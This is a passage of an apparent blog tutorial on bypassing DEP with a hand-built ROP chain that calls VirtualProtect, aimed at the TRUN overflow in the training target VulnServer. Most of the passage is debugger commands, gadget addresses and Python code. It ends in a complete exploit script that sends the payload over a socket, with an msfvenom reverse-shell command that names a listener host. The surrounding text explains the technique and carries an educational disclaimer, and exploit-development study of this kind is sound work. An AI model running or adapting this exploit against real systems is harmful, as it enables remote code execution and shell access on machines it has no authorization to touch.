+    0 [       0] address [size] of Security Directory
+ 7000 [      E4] address [size] of Base Relocation Directory
+    0 [       0] address [size] of Debug Directory
+    0 [       0] address [size] of Description Directory
+    0 [       0] address [size] of Special Directory
+    0 [       0] address [size] of Thread Storage Directory
+    0 [       0] address [size] of Load Configuration Directory
+    0 [       0] address [size] of Bound Import Directory
+    0 [       0] address [size] of Import Address Table Directory
+    0 [       0] address [size] of Delay Import Directory
+    0 [       0] address [size] of COR20 Header Directory
+    0 [       0] address [size] of Reserved Directory
+</code></pre>
+<ol start="2">
+<li>Dump the IAT and search for VirtualProtect:</li>
+</ol>
+<pre class="language-none"><code class="language-none">dps essfunc+0x6000 L100
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none"> 62506090  764cb3a0 KERNEL32!AddAtomA
+ 62506094  764cb860 KERNEL32!FindAtomA
+ 62506098  7650d160 KERNEL32!GetAtomNameA
+ 6250609c  764d6570 KERNEL32!VirtualProtectStub
+ 625060a0  764d7b60 KERNEL32!VirtualQueryStub
+</code></pre>
+<ol start="3">
+<li>Verify this is the correct function:</li>
+</ol>
+<pre class="language-none"><code class="language-none">dd 0x6250609c L1
+u poi(0x6250609c)
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">764d6570 8bff            mov     edi,edi
+764d6572 55              push    ebp
+764d6573 8bec            mov     ebp,esp
+764d6575 5d              pop     ebp
+764d6576 ff253cb85376    jmp     dword ptr [KERNEL32!_imp__VirtualProtect (7653b83c)]
+KERNEL32!AppModelPolicy_GetPolicy_Internal:
+764d657c 8bff            mov     edi,edi
+764d657e 55              push    ebp
+764d657f 8bec            mov     ebp,esp
+</code></pre>
+<p>We've confirmed 0x6250609c is the IAT entry for VirtualProtect.</p>
+<h2>5. Finding a Writable Memory Region</h2>
+<p>For the VirtualProtect call, the lpflOldProtect parameter requires a pointer to a writable memory location. We need to find such a location that is reliable and doesn't contain bad characters in its address. We can inspect the memory layout of loaded modules, like KERNEL32.DLL, to find writable sections.</p>
+<ol>
+<li>First, find the base address of KERNEL32.DLL:</li>
+</ol>
+<pre class="language-none"><code class="language-none">lm vm kernel32
+</code></pre>
+<p>Output</p>
+<pre class="language-none"><code class="language-none">start    end        module name
+764c0000 765b0000   kernel32   (deferred)
+</code></pre>
+<p>So, the base address is 0x764c0000.</p>
+<ol start="2">
+<li>Now, examine the PE header of KERNEL32.DLL to find its sections:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!dh 0x764c0000
+</code></pre>
+<p>Scroll through the output looking for the "SECTION HEADER" information. You are looking for a section with "Write" permissions (often .data).</p>
+<pre class="language-none"><code class="language-none">[...]
+SECTION HEADER #6
+   .data name
+  5AF4 virtual size
+ 7A000 virtual address (RVA)
+  5C00 size of raw data
+ 78C00 file pointer to raw data
+     0 file pointer to relocation table
+     0 file pointer to line numbers
+     0 number of relocations
+     0 number of line numbers
+40000040 flags
+         Initialized Data
+         Read Write  &#x3C;-- Writable permissions!
+[...]
+</code></pre>
+<ol start="3">
+<li>Identify a writable section. The .data section looks promising:</li>
+</ol>
+<ul>
+<li>It has Read Write permissions.</li>
+<li>Its Relative Virtual Address (RVA) is 0x7a000.</li>
+</ul>
+<ol start="4">
+<li>Calculate the absolute start address of the .data section:</li>
+</ol>
+<pre class="language-none"><code class="language-none">? &#x3C;base_address> + &#x3C;RVA>
+? 0x764c0000 + 0x7a000
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">Evaluate expression: 1985187840 = 7653a000
+</code></pre>
+<ol start="5">
+<li>
+<p>Choose an address within this writable section. We need an address suitable for lpflOldProtect. Let's use 0x7653a3c1, which is used later in the ROP chain. This address is calculated as 0x7653a000 + 0x3c1. Since 0x3c1 is less than the section size (0x5af4), this address lies within the writable .data section.</p>
+</li>
+<li>
+<p>Verify the chosen address 0x7653a3c1 has the expected permissions:</p>
+</li>
+</ol>
+<pre class="language-none"><code class="language-none">!vprot 0x7653a3c1
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">BaseAddress:       7653a000
+AllocationBase:    764c0000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        00006000  // Note: RegionSize might cover more than just .data
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE  &#x3C;-- Confirmed Writable
+Type:              01000000  MEM_IMAGE
+</code></pre>
+<p>We have successfully identified 0x7653a3c1 within KERNEL32.DLL's .data section as a suitable writable address using PE header inspection. We will use this address for the lpflOldProtect parameter.</p>
+<h2>6. Building Register Setup for VirtualProtect</h2>
+<p>Now we'll build our ROP chain to call VirtualProtect. Here's the function prototype:</p>
+<pre class="language-none"><code class="language-none">BOOL VirtualProtect(
+  LPVOID lpAddress,      // [ESP+4]  (Memory address to modify)
+  SIZE_T dwSize,         // [ESP+8]  (Size of region)
+  DWORD flNewProtect,    // [ESP+12] (Memory protection flag)
+  PDWORD lpflOldProtect  // [ESP+16] (Pointer to store old protection)
+);
+</code></pre>
+<p>When we use PUSHAD, the registers are pushed in this order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI.</p>
+<p>These values will map to VirtualProtect's parameters as follows:</p>
+<pre class="language-none"><code class="language-none">BOOL VirtualProtect(
+  LPVOID lpAddress,      // ECX -> [ESP+4]  (Address of shellcode)
+  SIZE_T dwSize,         // EDX -> [ESP+8]  (Size of region to make executable)
+  DWORD flNewProtect,    // EBX -> [ESP+C]  (PAGE_EXECUTE_READWRITE 0x40)
+  PDWORD lpflOldProtect  // ESP+8 -> [ESP+10] (Writable memory address)
+);
+</code></pre>
+<p>Let's build our ROP chain, setting up each register with the right value:</p>
+<h3>6.1 Setting up EBP (Stack Alignment)</h3>
+<pre class="language-python"><code class="language-python"># EBP - Used for stack pivot or alignment
+ebp = struct.pack("&#x3C;I", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]
+ebp += struct.pack("&#x3C;I", 0x775d8836)  # skip 4 bytes [msvcrt.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x775d8836 (same as gadget address)
+<strong>Reason</strong>: This serves as a placeholder and helps with stack alignment. Using the same address helps maintain predictable stack behavior.</p>
+<p><strong>How we found it</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop ebp # ret" -m "msvcrt" -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>Use JMP ESP directly</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">ebp = struct.pack("&#x3C;I", 0x775d8836)  # pop ebp; ret
+ebp += struct.pack("&#x3C;I", 0x625011af)  # jmp esp
+</code></pre>
+<ol start="2">
+<li><strong>Other module address</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">ebp = struct.pack("&#x3C;I", 0x76fa54a3)  # pop ebp; ret [KERNEL32.dll]
+ebp += struct.pack("&#x3C;I", 0x76fa54a3)  # same address
+</code></pre>
+<h3>6.2 Setting up EBX (flNewProtect parameter)</h3>
+<pre class="language-python"><code class="language-python"># EBX - Size parameter (0x201)
+ebx = struct.pack("&#x3C;I", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]
+ebx += struct.pack("&#x3C;I", 0xfffffdff)  # Value to negate, will become 0x00000201
+ebx += struct.pack("&#x3C;I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]
+ebx += struct.pack("&#x3C;I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x201 (Size of region to protect)
+<strong>Reason</strong>: This needs to be large enough to cover our shellcode (513 bytes).</p>
+<p><strong>How we calculated it</strong>: Using negation technique to avoid null bytes:</p>
+<ol>
+<li>Load EAX with 0xfffffdff (value to negate, will become 0x00000201)</li>
+<li>Negate EAX to get 0x201</li>
+<li>Exchange EAX and EBX</li>
+</ol>
+<p><strong>How we found these gadgets</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop eax" -m "kernelbase" -cpb "\x00"
+!py mona find -type instr -s "neg eax" -m "kernel32" -cpb "\x00"
+!py mona find -type instr -s "xchg eax, ebx" -m "msvcrt" -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>Adding from zero</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">ebx = struct.pack("&#x3C;I", 0x77cef70e)  # xor eax, eax; ret
+ebx += struct.pack("&#x3C;I", 0x775b3084)  # add eax, 0x100; ret
+ebx += struct.pack("&#x3C;I", 0x775b3084)  # add eax, 0x100; ret
+ebx += struct.pack("&#x3C;I", 0x775b616f)  # add eax, 8; ret
+ebx += struct.pack("&#x3C;I", 0x77597926)  # xchg eax, ebx; ret
+</code></pre>
+<ol start="2">
+<li><strong>Different size value</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">ebx = struct.pack("&#x3C;I", 0x75f366b4)  # pop eax; ret
+ebx += struct.pack("&#x3C;I", 0xfffffeff)  # -0x101 (smaller region)
+ebx += struct.pack("&#x3C;I", 0x76505808)  # neg eax; ret
+ebx += struct.pack("&#x3C;I", 0x77597926)  # xchg eax, ebx; ret
+</code></pre>
+<h3>6.3 Setting up EDX (dwSize parameter)</h3>
+<pre class="language-python"><code class="language-python"># EDX - Protection flag (0x40)
+edx = struct.pack("&#x3C;I", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]
+edx += struct.pack("&#x3C;I", 0xffffffc0)  # Value to negate, will become 0x00000040
+edx += struct.pack("&#x3C;I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]
+edx += struct.pack("&#x3C;I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x40 (PAGE_EXECUTE_READWRITE)
+<strong>Reason</strong>: This is the memory protection flag to make our shellcode executable.</p>
+<p><strong>How we calculated it</strong>: Using negation to avoid null bytes:</p>
+<ol>
+<li>Load EAX with 0xffffffc0 (value to negate, will become 0x00000040)</li>
+<li>Negate EAX to get 0x40</li>
+<li>Exchange EAX and EDX</li>
+</ol>
+<p><strong>How we found these gadgets</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop eax" -m "kernelbase" -cpb "\x00"
+!py mona find -type instr -s "neg eax" -m "kernel32" -cpb "\x00"
+!py mona find -type instr -s "xchg eax, edx" -m "ntdll" -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>Direct POP</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">edx = struct.pack("&#x3C;I", 0x77e4b949)  # pop edx; ret
+edx += struct.pack("&#x3C;I", 0x00000040)  # PAGE_EXECUTE_READWRITE
+</code></pre>
+<ol start="2">
+<li><strong>Arithmetic with other constants</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">edx = struct.pack("&#x3C;I", 0x77cef70e)  # xor eax, eax; ret
+edx += struct.pack("&#x3C;I", 0x775a5f04)  # add eax, 0x20; ret
+edx += struct.pack("&#x3C;I", 0x775a5f04)  # add eax, 0x20; ret
+edx += struct.pack("&#x3C;I", 0x77d9e6c0)  # xchg eax, edx; ret
+</code></pre>
+<h3>6.4 Setting up ECX (lpAddress parameter)</h3>
+<pre class="language-python"><code class="language-python">ecx = struct.pack("&#x3C;I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
+ecx += struct.pack("&#x3C;I", 0x7653a3c1)  # &#x26;Writable location [KERNEL32.DLL]
+</code></pre>
+<p><strong>Current Value</strong>: 0x7653a3c1 (Writable memory address in KERNEL32.DLL)
+<strong>Reason</strong>: This register needs to hold the pointer to a writable memory location (lpflOldProtect parameter) where VirtualProtect can store the old memory protection flags.</p>
+<p><strong>How we found it</strong>: We identified a suitable writable address within KERNEL32.DLL's .data in Section 5.</p>
+<p><strong>How we found the gadget</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop ecx # ret" -m "msvcrt" -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>Using essfunc.dll's writable memory</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">ecx = struct.pack("&#x3C;I", 0x775f94ee)  # pop ecx; ret
+ecx += struct.pack("&#x3C;I", 0x62506228)  # Writable memory in essfunc.dll
+</code></pre>
+<ol start="2">
+<li><strong>Stack Address</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python"># Use the current ESP value plus an offset
+ecx = struct.pack("&#x3C;I", 0x77c3f1a4)  # mov ecx, esp; add ecx, 0x10; ret
+</code></pre>
+<p>Stack Address (More complex): Technique exist to calculate and use an address on the stack itself, but require careful offset management.</p>
+<h3>6.5 Setting up EDI (ROP NOP)</h3>
+<pre class="language-python"><code class="language-python"># EDI - Return address (ROP NOP)
+edi = struct.pack("&#x3C;I", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]
+edi += struct.pack("&#x3C;I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
+</code></pre>
+<p><strong>Current Value</strong>: 0x7650580a (RET instruction)
+<strong>Reason</strong>: EDI isn't used directly in the VirtualProtect call, but it needs a valid address. A simple RET instruction works as a placeholder.</p>
+<p><strong>How we found it</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop edi" -m "ws2_32" -cpb "\x00"
+!py mona find -type instr -s "ret" -m kernel32 -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>Any harmless gadget</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">edi = struct.pack("&#x3C;I", 0x76fe83f7)  # pop edi; ret
+edi += struct.pack("&#x3C;I", 0x90909090)  # NOP values
+</code></pre>
+<ol start="2">
+<li><strong>Secondary return address</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">edi = struct.pack("&#x3C;I", 0x76fe83f7)  # pop edi; ret
+edi += struct.pack("&#x3C;I", 0x625011c7)  # Alternative JMP ESP
+</code></pre>
+<h3>6.6 Setting up ESI (JMP [EAX])</h3>
+<pre class="language-python"><code class="language-python"># ESI - Pointer to JMP [EAX] gadget
+esi = struct.pack("&#x3C;I", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]
+esi += struct.pack("&#x3C;I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x75e95833 (JMP [EAX] instruction)
+<strong>Reason</strong>: This technique is crucial for our exploit. After PUSHAD, execution continues at the address in ESI. This gadget will jump to the address pointed to by EAX (which we'll set to VirtualProtect).</p>
+<p><strong>How we found it</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop esi" -m "kernel32" -cpb "\x00"
+!py mona find -type instr -s "jmp dword ptr [eax]" -m "kernelbase" -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>CALL [EAX] instead of JMP</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">esi = struct.pack("&#x3C;I", 0x76525760)  # pop esi; ret
+esi += struct.pack("&#x3C;I", 0x75e9583b)  # call dword ptr [eax]; ret
+</code></pre>
+<ol start="2">
+<li><strong>Direct IAT pointer technique</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">esi = struct.pack("&#x3C;I", 0x76525760)  # pop esi; ret
+esi += struct.pack("&#x3C;I", 0x6250609c)  # VirtualProtect IAT
+</code></pre>
+<h3>6.7 Setting up EAX (VirtualProtect pointer)</h3>
+<pre class="language-python"><code class="language-python"># EAX - Point to VirtualProtect
+eax = struct.pack("&#x3C;I", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]
+eax += struct.pack("&#x3C;I", 0x6250609c)  # ptr to &#x26;VirtualProtect() [IAT essfunc.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x6250609c (VirtualProtect IAT entry)</p>
+<p><strong>Reason</strong>: When ESI (which contains JMP [EAX]) executes, it will jump to the address pointed to by EAX, which is VirtualProtect in the IAT.</p>
+<p><strong>How we found the gadget</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pop eax" -m "kernelbase" -cpb "\x00"
+</code></pre>
+<p><strong>How we found the IAT entry</strong>:</p>
+<pre class="language-none"><code class="language-none">!dh essfunc -f
+dps essfunc+0x6000 L100
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>MOV EAX technique</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">eax = struct.pack("&#x3C;I", 0x75f10ada)  # mov eax, 0x6250609c; ret
+</code></pre>
+<ol start="2">
+<li><strong>Arithmetic calculation</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">eax = struct.pack("&#x3C;I", 0x77cef70e)  # xor eax, eax; ret
+eax += struct.pack("&#x3C;I", 0x75ee0982)  # add eax, 0x6250609c; ret
+</code></pre>
+<h3>6.8 Using PUSHAD to call VirtualProtect</h3>
+<pre class="language-python"><code class="language-python"># PUSHAD to call VirtualProtect
+pushad = struct.pack("&#x3C;I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x775d6f67 (PUSHAD; RET instruction)
+<strong>Reason</strong>: PUSHAD pushes all 8 general-purpose registers onto the stack in a specific order, setting up the parameter stack for VirtualProtect.</p>
+<p><strong>How we found it</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pushad # ret" -m "msvcrt" -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>PUSHAD from another module</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">pushad = struct.pack("&#x3C;I", 0x76081981)  # pushad; ret [KERNEL32.dll]
+</code></pre>
+<ol start="2">
+<li><strong>Manual parameter pushing (more complex)</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python"># Instead of PUSHAD, manually push each parameter
+# Note: This approach is much longer and more complex
+manual_push = struct.pack("&#x3C;I", 0x77cdeedf)  # pop edi; ret
+manual_push += struct.pack("&#x3C;I", 0x6250609c)  # VirtualProtect IAT
+manual_push += struct.pack("&#x3C;I", 0x7654321a)  # push edi; ret
+# ... More pushes for each parameter
+</code></pre>
+<h3>6.9 JMP ESP Gadget</h3>
+<pre class="language-python"><code class="language-python"># JMP ESP gadget for shellcode execution
+jmp_esp = struct.pack("&#x3C;I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]
+</code></pre>
+<p><strong>Current Value</strong>: 0x625011c7 (JMP ESP instruction)
+<strong>Reason</strong>: This is where VirtualProtect will return after execution. It jumps to the shellcode on the stack.</p>
+<p><strong>How we found it</strong>:</p>
+<pre class="language-none"><code class="language-none">!py mona jmp -r esp -m essfunc -cpb "\x00"
+</code></pre>
+<p><strong>Alternative Options</strong>:</p>
+<ol>
+<li><strong>CALL ESP</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">jmp_esp = struct.pack("&#x3C;I", 0x62501205)  # call esp
+</code></pre>
+<ol start="2">
+<li><strong>PUSH ESP / RET</strong>:</li>
+</ol>
+<pre class="language-python"><code class="language-python">jmp_esp = struct.pack("&#x3C;I", 0x625013df)  # push esp; ret
+</code></pre>
+<h2>7. Complete Exploit Code</h2>
+<p>Let's put everything together:</p>
+<pre class="language-python"><code class="language-python">#!/usr/bin/python
+import struct
+import socket
+
+TARGET_IP = "192.168.0.112"
+TARGET_PORT = 9999
+target = (TARGET_IP, TARGET_PORT)
+
+VULNSRVR_CMD = b"TRUN /.:/"
+TOTAL_BUFFER_LEN = 6000
+OFFSET = 2003
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\x00'
+buf =  b"" # Shellcode generated by msfvenom - full bytes omitted for brevity
+...
+
+# Build the final ROP chain
+rop = b""
+# EBP - Stack pivot setup (using POP EBP # RETN as placeholder/alignment)
+rop += struct.pack("&#x3C;I", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]
+rop += struct.pack("&#x3C;I", 0x775d8836)  # Value for EBP (can be anything, using gadget address)
+# EBX - Setup Size parameter (0x201) for VirtualProtect
+rop += struct.pack("&#x3C;I", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]
+rop += struct.pack("&#x3C;I", 0xfffffdff)  # Load -0x201 into EAX
+rop += struct.pack("&#x3C;I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x201)
+rop += struct.pack("&#x3C;I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll] (EBX = 0x201)
+# EDX - Setup Protection flag (0x40) for VirtualProtect
+rop += struct.pack("&#x3C;I", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]
+rop += struct.pack("&#x3C;I", 0xffffffc0)  # Load -0x40 into EAX
+rop += struct.pack("&#x3C;I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x40)
+rop += struct.pack("&#x3C;I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll] (EDX = 0x40)
+# ECX - Setup lpflOldProtect parameter for VirtualProtect
+rop += struct.pack("&#x3C;I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
+rop += struct.pack("&#x3C;I", 0x7653a3c1)  # &#x26;Writable location [KERNEL32.DLL] (ECX = ptr)
+# EDI - Setup Return Address (used as ROP NOP here)
+rop += struct.pack("&#x3C;I", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]
+rop += struct.pack("&#x3C;I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
+# ESI - Setup Pointer to JMP [EAX] gadget (used after PUSHAD)
+rop += struct.pack("&#x3C;I", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]
+rop += struct.pack("&#x3C;I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
+# EAX - Setup Pointer to VirtualProtect IAT entry
+rop += struct.pack("&#x3C;I", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]
+rop += struct.pack("&#x3C;I", 0x6250609c)  # ptr to &#x26;VirtualProtect() [IAT essfunc.dll]
+# PUSHAD - Push registers to stack for VirtualProtect call
+rop += struct.pack("&#x3C;I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
+# JMP ESP - Return address after VirtualProtect, jumps to shellcode
+rop += struct.pack("&#x3C;I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]
+
+# Add NOP sled and shellcode
+nop = b"\x90" * 16
+final_rop = rop + nop + buf # Note: Place shellcode 'buf' after NOPs
+
+# Build the final payload
+payload = VULNSRVR_CMD
+payload += b"A" * OFFSET
+payload += final_rop # Use the ROP chain including NOPs and shellcode
+payload += b"C" * (TOTAL_BUFFER_LEN - len(payload)) # Padding
+
+# Send the exploit
+with socket.create_connection(target) as sock:
+    sock.recv(512)  # Welcome message
+    sent = sock.send(payload)
+    print(f"sent {sent} bytes")
+    print("[x] Exploit sent")
+</code></pre>
+<h2>8. Understanding How the Exploit Works</h2>
+<p>This exploit uses a <code>JMP [EAX]</code> technique combined with <code>PUSHAD</code> to call <code>VirtualProtect</code> and make our shellcode executable:</p>
+<ol>
+<li>The initial buffer fills memory until it overwrites the saved <code>EIP</code> register at the <code>2003</code> byte offset.</li>
+<li>EIP is overwritten with the address of the first gadget in our ROP chain (e.g., the <code>POP EBP</code> gadget used for alignment/setup).</li>
+<li>The ROP chain executes sequentially: Gadgets pop values into <code>EBP</code>, <code>EBX</code>, <code>EDX</code>, <code>EBX</code>, <code>ESP</code>, <code>EBP</code>, <code>ESI</code>, <code>EDI</code>, setting them up according to our plan.</li>
+<li>Crucially, just before <code>PUSHAD</code>:</li>
+</ol>
+<ul>
+<li><code>EAX</code> holds the address of the VirtualProtect IAT pointer (<code>0x6250609c</code>).</li>
+<li><code>ESI</code> holds the address of a <code>JMP DWORD PTR [EAX]</code> gadget (<code>0x75e95833</code>).</li>
+<li><code>EBX</code>, <code>EDX</code>, <code>ECX</code> hold the required parameters for <code>VirtualProtect</code> (<code>dwSize</code>, <code>flNewProtect</code>, <code>lpflOldProtect</code>).</li>
+<li><code>EDI</code> and <code>EBP</code> hold placeholders or <code>ROP NOP</code>s.</li>
+</ul>
+<ol start="5">
+<li>The <code>PUSHAD</code> instruction (<code>0x775d6f67</code>) executes. It pushes the current values of <code>EAX</code>, <code>ECX</code>, <code>EDX</code>, <code>EBX</code>, <code>ESP</code> (original value before <code>PUSHAD</code>), <code>EBP</code>, <code>ESI</code>, <code>EDI</code> onto the stack. This arranges the parameters needed by <code>VirtualProtect</code> at known offsets from the current stack pointer <code>ESP</code>.</li>
+<li>The <code>RETN</code> instruction that is part of the <code>PUSHAD # RETN</code> gadget executes. It pops the next value from the stack into <code>EIP</code>. Crucially, the way the ROP chain is constructed and aligned means this value popped is the address we loaded into <code>ESI</code> (<code>0x75e95833</code>, the address of the <code>JMP DWORD PTR [EAX]</code> gadget). (Assuming the intended technique works as described).</li>
+<li>Execution jumps to the <code>JMP DWORD PTR [EAX]</code> gadget.</li>
+<li>This gadget then jumps to the address currently stored in <code>EAX</code>, which is the address of the <code>VirtualProtect</code> IAT entry (<code>0x6250609c</code>).</li>
+<li><code>VirtualProtect</code> executes. It finds its parameters on the stack where <code>PUSHAD</code> placed them. The <code>lpAddress</code> parameter (effectively the stack pointer <code>ESP</code> where the shellcode lies after the ROP chain arguments) indicates the memory to modify, <code>dwSize</code> is <code>0x201</code> (from <code>EBX</code> via stack), <code>flNewProtect</code> is <code>0x40</code> (from <code>EDX</code> via stack), and <code>lpflOldProtect</code> points to the writable KERNEL32 address (from <code>ECX</code> via stack). <code>VirtualProtect</code> makes the shellcode memory region executable.</li>
+<li><code>VirtualProtect</code> finishes and executes its own <code>RET</code> instruction. The return address on the stack at this point is the one originally placed after the <code>PUSHAD # RETN</code> gadget sequence in our main ROP chain: the address of our <code>JMP ESP</code> gadget (<code>0x625011c7</code>).</li>
+<li>The <code>JMP ESP</code> gadget executes, transferring control directly to the <code>NOP</code> sled and then the shellcode located immediately following it on the stack.</li>
+<li>Our shellcode executes, creating a reverse shell (or performing its intended action).</li>
+</ol>
+<h2>9. Tips and Troubleshooting</h2>
+<ol>
+<li>
+<p>Always verify gadgets in the debugger to ensure they do exactly what you expect.</p>
+</li>
+<li>
+<p>Make sure your gadget addresses don't contain any bad characters (like \x00 in our case).</p>
+</li>
+<li>
+<p>Be aware of gadgets that affect multiple registers. For example, our "pop ecx" gadget also pops EDX.</p>
+</li>
+<li>
+<p>The PUSHAD technique requires careful stack alignment. Make sure the stack values are in the right order for VirtualProtect parameters.</p>
+</li>
+<li>
+<p>Use breakpoints liberally and check register values at each step to identify issues.</p>
+</li>
+<li>
+<p>If one approach doesn't work, try another. ROP chain development often requires creativity.</p>
+</li>
+</ol>
+<h2>Conclusion</h2>
+<p>Bypassing DEP might seem daunting at first, but with a methodical approach and understanding of ROP chains, it becomes a manageable challenge. By carefully selecting gadgets and leveraging Windows APIs like VirtualProtect, we can overcome even sophisticated memory protections.</p>
+<p>What's particularly elegant about this technique is how we're using the operating system's own APIs against it. Instead of trying to break DEP, we're simply asking Windows nicely to change the memory protection for us.</p>
+<p>Remember that while this technique works reliably for bypassing DEP, modern exploit mitigations rarely exist in isolation. Real-world targets often combine DEP with ASLR, CFG, and other protections that require additional bypass techniques.</p>
+<p>The most important takeaway from this exercise isn't just the specific VirtualProtect technique, but the methodology for manually building and understanding ROP chains. By mastering these fundamentals, you'll be well-equipped to tackle even more complex exploitation scenarios.</p>
+<p>Happy Overflowing!</p>
+<hr>
+<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
+</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"slug":"virtualprotect_dep_bypass_guide","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/dep-bypass.jpeg\" alt=\"ROP chain exploitation techniques\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eData Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calling it a day are long gone. DEP enforces a simple rule: memory can be writable OR executable, but not both at the same time.\u003c/p\u003e\n\u003cp\u003eSo what happens when you try to execute shellcode in a classic buffer overflow? DEP detects code execution from a writable memory area and shuts everything down. Game over.\u003c/p\u003e\n\u003cp\u003eBut DEP isn't the impenetrable wall it appears to be. Through the magic of Return-Oriented Programming (ROP), we can leverage existing executable code to call Windows APIs that change memory protections, effectively bypassing DEP.\u003c/p\u003e\n\u003cp\u003eIn this guide, I'll walk you through manually creating a ROP chain to exploit VulnServer's TRUN command vulnerability with DEP enabled. Unlike many tutorials that rely on automated tools, we'll build our exploit piece by piece, understanding each step along the way.\u003c/p\u003e\n\u003ch2\u003ePrerequisites\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eWindows 7/10 (32-bit) with WinDbg or Immunity Debugger with Mona.py. (This guide focuses on the 32-bit architecture).\u003c/li\u003e\n\u003cli\u003eVulnServer running on a Windows VM (ensure it's the 32-bit version).\u003c/li\u003e\n\u003cli\u003ePython 3 for exploit development\u003c/li\u003e\n\u003cli\u003eBasic understanding of vanilla buffer overflows\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e1. Understanding 